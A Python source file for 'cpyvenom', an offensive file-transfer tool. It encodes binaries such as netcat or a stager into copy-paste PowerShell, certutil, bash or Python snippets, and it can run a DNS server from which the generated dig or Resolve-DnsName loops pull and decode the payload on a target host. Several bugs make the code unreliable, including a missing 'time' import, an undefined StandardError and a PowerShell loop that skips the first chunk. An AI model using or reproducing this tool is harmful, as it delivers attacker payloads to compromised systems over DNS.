#!/usr/bin/env python3

import sys, getopt
from base64 import b64encode
import datetime
import socketserver
import struct
import threading
import traceback

if "dns/bash" in sys.argv or "dns/powershell" in sys.argv:
    try:
        from dnslib import *
    except ImportError:
        print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
        sys.exit(2)



def usage():
    print ("""

..######..########..##....##.##.....##.########.##....##..#######..##.....##
.##....##.##.....##..##..##..##.....##.##.......###...##.##.....##.###...###
.##.......##.....##...####...##.....##.##.......####..##.##.....##.####.####
.##.......########.....##....##.....##.######...##.##.##.##.....##.##.###.##
.##.......##...........##.....##...##..##.......##..####.##.....##.##.....##
.##....##.##...........##......##.##...##.......##...###.##.....##.##.....##
..######..##...........##.......###....########.##....##..#######..##.....##

    
Transfer files with a simple copy/paste from terminal when no other options are available


Usage: cpyvenom.py -p <payload> -i <inputfile> -d <destination> -o <save_to_outputfile> -b 100 

Available commands:

    -p / --payload          windows/powershell, windows/certutil, linux/bash, linux/python, 
                            dns/powershell, dns/bash

    -i / --input-file       file path to send

    -o / --output-file      save the encoded output to file, default to stdout

    -d / --destination      destination path in the remote system

    -b / --block            size of the block

    ____________________________________

    Arguments that work only on dns payloads:

    -P / --port             the DNS Server listening port
    
    --udp /--tcp            Connection method
    
    --dns-ip                dns domain or IP address to query
    
    --sleep                 delay between requests (seconds, default 1)
    
    --no-server             print the snippet without setup the listening server


    Example:

        windows:
            python3 cpyvenom.py -i nc.exe -o nc.cpyvenom -p winows/powershell -d "C:\\temp\\nc.exe"

        linux:
            python3 cpyvenom.py -i /bin/nc -o nc.cpv -p linux/bash -d /tmp/nc


    DNS payload Examples:
        
        windows:
            sudo python3 cpyvenom.py -p dns/powershell --input-file=nc.exe -d "c:\\temp\\nc.exe"  --dns-ip=192.168.0.254 --port=53 
        
        linux:
            sudo python3 cpyvenom.py -p dns/bash --input-file=stager -d "/tmp/stager"  --dns-ip=192.168.0.254 --port=53
        


""")

file_chunks = []

class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s request %s (%s %s)" % (self.__class__.__name__[:3], now, self.client_address[0],
                                               self.client_address[1]))
        try:
            data = self.get_data()
            #print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def prepare_file(filename,block):
    
    print('Preparing file chunks...')
    content = open(filename,'rb').read()
    file_content = b64encode(content).decode('ascii')
    splitted_encoded = [file_content[i:i+block] for i in range(0, len(file_content), block)]
    return splitted_encoded



def decode_labels(message, offset):
    labels = []
    while True:
        length, = struct.unpack_from("!B", message, offset)
        if (length & 0xC0) == 0xC0:
            pointer, = struct.unpack_from("!H", message, offset)
            offset += 2
            return labels + decode_labels(message, pointer & 0x3FFF), offset
        if (length & 0xC0) != 0x00:
            raise StandardError("unknown label encoding")
        offset += 1
        if length == 0:
            return labels, offset
        labels.append(*struct.unpack_from("!%ds" % length, message, offset))
        offset += length

DNS_QUERY_SECTION_FORMAT = struct.Struct("!2H")

def decode_question_section(message, offset, qdcount):
    questions = []
    for _ in range(qdcount):
        qname, offset = decode_labels(message, offset)
        qtype, qclass = DNS_QUERY_SECTION_FORMAT.unpack_from(message, offset)
        offset += DNS_QUERY_SECTION_FORMAT.size
        question = {"domain_name": qname,
                    "query_type": qtype,
                    "query_class": qclass}
        questions.append(question)
    return questions, offset


DNS_QUERY_MESSAGE_HEADER = struct.Struct("!6H")

def decode_dns_message(message):
    id, misc, qdcount, ancount, nscount, arcount = DNS_QUERY_MESSAGE_HEADER.unpack_from(message)
    qr = (misc & 0x8000) != 0
    opcode = (misc & 0x7800) >> 11
    aa = (misc & 0x0400) != 0
    tc = (misc & 0x200) != 0
    rd = (misc & 0x100) != 0
    ra = (misc & 0x80) != 0
    z = (misc & 0x70) >> 4
    rcode = misc & 0xF
    offset = DNS_QUERY_MESSAGE_HEADER.size
    questions, offset = decode_question_section(message, offset, qdcount)
    result = {"id": id,
              "is_response": qr,
              "opcode": opcode,
              "is_authoritative": aa,
              "is_truncated": tc,
              "recursion_desired": rd,
              "recursion_available": ra,
              "reserved": z,
              "response_code": rcode,
              "question_count": qdcount,
              "answer_count": ancount,
              "authority_count": nscount,
              "additional_count": arcount,
              "questions": questions}
    return result



 
                                    
def dns_response(data):
    global file_chunks
    request = DNSRecord.parse(data)

    record = decode_dns_message(data)
    print('requested ' + record['questions'][0]['domain_name'][0].decode())
    name_chunk = record['questions'][0]['domain_name'][0].decode() 
    index = 0
    if name_chunk[0] == 'c':
        index = int(name_chunk[1:]) -1
    qname = request.q.qname
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, rd=1, ra=1), q=request.q)
    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(file_chunks[index])))
    return reply.pack()


def startDnsServer(dns_listening_port,connection_udp):
    servers = []

    try:
        if connection_udp:
            socketserver.ThreadingUDPServer.allow_reuse_address=True 
            servers.append(socketserver.ThreadingUDPServer(('', dns_listening_port), UDPRequestHandler))
        else: 
            socketserver.ThreadingTCPServer.allow_reuse_address=True
            servers.append(socketserver.ThreadingTCPServer(('', dns_listening_port), TCPRequestHandler))
    except:
        traceback.print_exc()
        print("\n\nCannot bind port {0}. \nMaybe you need to run the script as root?".format(dns_listening_port))
        sys.exit()

    for s in servers:
        thread = threading.Thread(target=s.serve_forever) 
        thread.daemon = True  
        thread.start()

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        print('Interrupted...exiting.')
    finally:
        for s in servers:
            s.shutdown()
    sys.exit()

def cpyvenom(inputfile,outputfile,payload,destination,block,dns_listening_port,connection_udp,dns_domain,delay_between_calls,listen):
    global file_chunks
    try:
        f = open(inputfile,'rb')
        content = f.read()

        text = ""

        if not payload:
            payload = "windows/powershell"

        if payload.lower() == "windows/powershell":
            text = """\nCopy from here:\n\n$FilePath="{}"\n$EncodedString =  '' \n""".format(destination)
            encoded = b64encode(content).decode('ascii')
            splitted_encoded = [encoded[i:i+block] for i in range(0, len(encoded), block)]
            for s in splitted_encoded:
                text += """$EncodedString+="{0}" \n""".format(s)
            text += """$ByteArray = [System.Convert]::FromBase64String($EncodedString);\n[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);\n"""
            
            
        
        if payload.lower()=="windows/certutil":
            suffix = datetime.datetime.now().strftime("%y%m%d%H%M%S")
            basename = "b64_"+suffix
            text = """\nCopy from here:\n\n"""
            encoded = b64encode(content).decode('ascii')
            splitted_encoded = [encoded[i:i+block] for i in range(0, len(encoded), block)]
            for s in splitted_encoded:
                text += """echo {0} >> %Temp%\\{1}\n""".format(s,basename)
            text += """certutil -decode %Temp%\\{0} {1}\n""".format(basename,destination)
            


        if payload.lower()=="linux/bash":
            suffix = datetime.datetime.now().strftime("%y%m%d%H%M%S")
            basename = ".b64_"+suffix
            text = """\nCopy from here:\n\n"""
            encoded = b64encode(content).decode('ascii')
            splitted_encoded = [encoded[i:i+block] for i in range(0, len(encoded), block)]
            for s in splitted_encoded:
                text += """echo {0} >> /tmp/{1}\n""".format(s,basename)
            text += """base64 -d /tmp/{0} > {1}\nrm -f /tmp/{0}""".format(basename,destination)
            


        if payload.lower()=="linux/python":
            text = """\nCopy from here:\n\nfrom base64 import b64decode\ns=""\n"""
            encoded = b64encode(content).decode('ascii')
            splitted_encoded = [encoded[i:i+block] for i in range(0, len(encoded), block)]
            for s in splitted_encoded:
                text += """s+="{0}"\n""".format(s)
            text += """decoded = b64decode(s)\n"""
            text += """f = open("{0}", 'wb')\nf.write(decoded)\nf.close()\n""".format(destination)


        if payload.lower()=="dns/bash":

            if block>250:
                print("Max allowed block size for DNS is 250")
                block=250
            file_chunks = prepare_file(inputfile,block)
            text = """\nCopy from here:\n\n**********\n\n"""
            text+="for n in $(seq 0 {0});do echo \"dig txt +short ".format(len(file_chunks)-1)
            if connection_udp==False:
                text+="+tcp "
            text+="c$n @{0} ".format(dns_domain)
            if dns_listening_port != 53:
                text+="-p {0}".format(dns_listening_port)
            text+=" & sleep {0}\" ;done | sh | tr -d '\"' | base64 -d > {1}".format(delay_between_calls,destination)
            text+="\n\n**********\n"
            if listen:
                print(text)
                print("Starting nameserver...^C to stop.")
                startDnsServer(dns_listening_port,connection_udp)

        if payload.lower()=="dns/powershell":
            if dns_listening_port != 53:
                print('\n\nOnly port 53 is allowed with this payload!\n')
                sys.exit()

            if block>250:
                print("Max allowed block size for DNS is 250")
                block=250
            file_chunks = prepare_file(inputfile,block)
            text = """\nCopy from here:\n\n**********\n\n$FilePath="{}"\n$EncodedString =  '' \n""".format(destination)
            
            text+= "for ($num = 1 ; $num -le {0} ; $num++)".format(len(file_chunks)-1)
            text+= "{$current='c'+$num.ToString()+'.com'; $EncodedString+=(Resolve-DnsName $current "
            text+= "-Server {0} | Select-Object -Property Strings ).Strings ;Start-Sleep -s {1} }};".format(dns_domain,delay_between_calls)
            text += """\n$ByteArray = [System.Convert]::FromBase64String($EncodedString);\n[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);\n"""
            text+="\n**********\n"
            if listen:
                print(text)
                print("Starting nameserver...^C to stop")
                startDnsServer(dns_listening_port,connection_udp)



        if not outputfile:
            print (text)
        else:
            try:
                f = open(outputfile,'w')
                f.write(text)
                f.close()
                print("\nGenerated file{0}\n ".format(outputfile))
            except IOError:
                print("Output file not accessibile")
                exit(0)


        f.close()
    except IOError:
        print("File not accessible")
        exit(0)
    
        




def main(argv):
    inputfile = ''
    outputfile = ''
    payload = ''
    destination = ''
    block = 200
    listen = True
    dns_listening_port = 5053
    connection_udp = True
    dns_domain = "localhost"
    delay_between_calls = 1


    try:
       opts, args = getopt.getopt(argv,"Php:i:o:f:d:b:",["payload=","input-file=","output-file=","destination-file=","block=","port=","udp","tcp","dns-ip=","sleep=","no-server"])
    except getopt.GetoptError:
        usage()
        sys.exit(2)

    if len(opts)==0:
        usage()
        exit(0)
    for opt, arg in opts:
        if opt == '-h':
            usage()
            sys.exit()
        elif opt in ("-i", "--input-file"):
            inputfile = arg
        elif opt in ("-o", "--output-file"):
            outputfile = arg
        elif opt in ("-p","--payload"):
            payload = arg
        elif opt in ("-d","--destination-file"):
            destination = arg
        elif opt in ("-b","--block"):
            block = int(arg)   
        elif opt in ("P","--port"):
            dns_listening_port = int(arg)
        elif opt in ("--udp"):
            connection_udp = True
        elif opt in ("--tcp"):
            connection_udp = False
        elif opt in ("--dns-ip"):
            dns_domain = arg
        elif opt in ("--sleep"):
            delay_between_calls = int(arg)
        elif opt in ("--no-server"):
            listen = False



    print ("Input file is ", inputfile)
    print ("Output file is ", 'StdOut' if not outputfile else outputfile) # if no output, default to stdout
    print ("Payload ", payload)   # default to windows/powershell
    print ("Destination" , destination)   
    

    if not inputfile or not destination:
        usage()
        exit(0)

    cpyvenom(inputfile,outputfile,payload,destination,block,dns_listening_port,connection_udp,dns_domain,delay_between_calls,listen)

if __name__ == "__main__":
    main(sys.argv[1:])

    #main(["--port=53","-p","dns/bash","--input-file=LICENSE","-d", "/tmp/test" ,"--domain=127.0.0.1","--sleep=2"])